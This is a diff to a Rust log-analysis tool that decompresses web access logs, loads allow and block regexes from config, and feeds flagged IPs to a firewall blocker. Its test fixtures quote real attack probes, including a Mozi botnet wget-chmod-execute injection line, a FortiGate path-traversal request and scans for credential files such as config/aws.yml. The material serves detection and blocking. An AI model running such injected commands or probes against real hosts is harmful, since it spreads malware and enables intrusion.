@@ -1,34 +1,69 @@
+use plog::config::Config;
+use tracing::{debug, error, info, instrument, warn};
+use tracing_subscriber::{fmt, EnvFilter};
+
 use flate2::bufread::GzDecoder;
 use lazy_static::lazy_static;
+use plog::block::add_ip_to_spammers;
+use plog::block::reload_firewall_rules;
 use regex::Regex;
 use std::fs::File;
 use std::io::prelude::*;
+
 use std::io::{self};
 
 
 lazy_static! {
     static ref IP: Regex = Regex::new(r"(?P<ip>(\d+\.\d+\.\d+\.\d+))").unwrap();
 
-    static ref UNWANTED: Vec<Regex> = vec![ Regex::new(r"(wp-*|\.php|\.xml|\.asp*|microsoft|\.env|\\x\d+|cgi-bin|HNAP1|formLogin|owa/auth/x|/dev|/tmp|/var/tmp)").unwrap() ];
+    /// WANTED have higher priority over UNWANTED
+    static ref WANTED: Vec<Regex> = Config::wanted().unwrap_or_default();
+    static ref UNWANTED: Vec<Regex> = Config::unwanted().unwrap_or_default();
 
-    static ref WANTED: Vec<Regex> = vec![ Regex::new(r"(/.well-known|\.svg|verknowsys|robots\.txt|favicon\.ico|[[:alnum:]]{32}\.png)").unwrap() ];
+}
+
+
+/// Initialize logger and tracingformatter
+#[instrument]
+fn initialize() {
+    let env_log = match EnvFilter::try_from_env("LOG") {
+        Ok(env_value_from_env) => env_value_from_env,
+        Err(_) => EnvFilter::from("info"),
+    };
+    fmt()
+        .compact()
+        .with_thread_names(false)
+        .with_thread_ids(false)
+        .with_ansi(true)
+        .with_env_filter(env_log)
+        .with_filter_reloading()
+        .init();
 }
 
 
 /// Uncompress the input file using simple GzEncoder
+#[instrument]
 fn decode_file(mut file: File) -> io::Result<Vec<u8>> {
     let mut buf = vec![];
-    let _ = file.read_to_end(&mut buf);
-    let mut deflater = GzDecoder::new(&*buf);
-    let mut s = vec![];
-    deflater.read_to_end(&mut s)?;
-    Ok(s)
+    match file.read_to_end(&mut buf) {
+        Ok(bytes_read) => {
+            info!("Input file read bytes: {bytes_read}");
+            let mut gzipper = GzDecoder::new(&*buf);
+            let mut output_buf = vec![];
+            gzipper.read_to_end(&mut output_buf)?;
+            drop(gzipper);
+            drop(buf);
+            Ok(output_buf)
+        }
+        Err(err) => Err(err),
+    }
 }
 
 
+#[instrument]
 fn main() {
-    let maybe_log =
-        File::open("/Users/dmilith/Projects/plog/access.log.gz").and_then(decode_file);
+    initialize();
+    let maybe_log = File::open(Config::access_log()).and_then(decode_file);
     let maybe_log = maybe_log
         .map(|input_data| {
             let input_data_length = input_data.len();
@@ -108,8 +143,9 @@ fn test_regex_match_wanted_and_unwanted() {
         r#"185.142.236.35 - - [05/Nov/2021:03:18:46 +0100] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0""#,
         r#"140.82.115.100 - - [05/Nov/2021:07:03:04 +0100] "GET /52ce884956e2373fb3e4be609d97a5b0.png HTTP/1.1" 301 169 "-" "github-camo (fa497f37)""#,
         r#"18.184.74.47 - - [05/Nov/2021:09:57:41 +0100] "GET //24a477a890163d15b8a66289e6d558a5.png HTTP/1.1" 404 153 "-" "Slack-ImgProxy (+https://api.slack.com/robots)""#,
-        /* r#""#,
-         * r#""#, */
+        r#"209.141.33.65 - - [06/Nov/2021:17:50:39 +0100] "GET //verknowsys.wasm HTTP/1.1" 200 220224 "https://verknowsys.com//" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36""#,
+        r#"116.179.37.171 - - [06/Nov/2021:23:37:59 +0100] "GET /css/style.css HTTP/1.1" 200 2131 "http://dmilith.verknowsys.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""#,
+        r#"188.121.1.62 - - [10/Nov/2021:09:39:45 +0100] "GET /8f02da2b61ae30db9428ab0a8a2cff8e.pdf HTTP/2.0" 200 44103 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36""#,
     ];
     let unwanted = [
         r#"51.75.194.66 - - [08/May/2022:07:36:00 +0200] "GET //mysqladmin/index.php?lang=en HTTP/2.0" 404 548 "http://31.179.184.210/mysqladmin/index.php?lang=en" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"#,
@@ -126,10 +162,14 @@ fn test_regex_match_wanted_and_unwanted() {
         r#"42.239.251.60 - - [05/Nov/2021:04:30:49 +0100] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 153 "-" "-""#,
         r#"23.228.109.147 - - [05/Nov/2021:06:16:59 +0100] "GET //fileupload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 404 153 "-" "ALittle Client""#,
         r#"45.146.164.110 - - [05/Nov/2021:07:45:34 +0100] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36""#,
-        /* r#""#,
-         * r#""#,
-         * r#""#,
-         * r#""#, */
+        r#"20.101.109.35 - - [08/May/2022:10:32:57 +0200] "GET /carbon/admin/login.jsp HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9""#,
+        r#"179.43.133.218 - - [07/May/2022:22:13:16 +0200] "\x05\x01\x00" 400 150 "-" "-""#,
+        r#"149.202.15.205 - - [06/May/2022:11:44:35 +0200] "GET //config/aws.yml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36""#,
+        r#"192.64.113.244 - - [05/May/2022:16:45:56 +0200] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 146 "-" "Python-urllib/3.8""#,
+        r#"51.91.7.5 - - [04/Nov/2021:22:44:53 +0100] "GET /shop/var/resource_config.json HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0""#,
+        r#"42.2.69.148 - - [09/Nov/2021:16:35:09 +0100] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 157 "-" "-""#,
+        r#"167.71.13.196 - - [10/Nov/2021:06:59:27 +0100] "GET /config.json HTTP/1.1" 404 153 "-" "l9explore/1.3.0""#,
+        r#"67.71.13.196 - - [10/Nov/2021:06:59:29 +0100] "GET /login.action HTTP/1.1" 404 153 "-" "l9explore/1.3.0""#,
     ];
 
     for w_reg in WANTED.iter() {
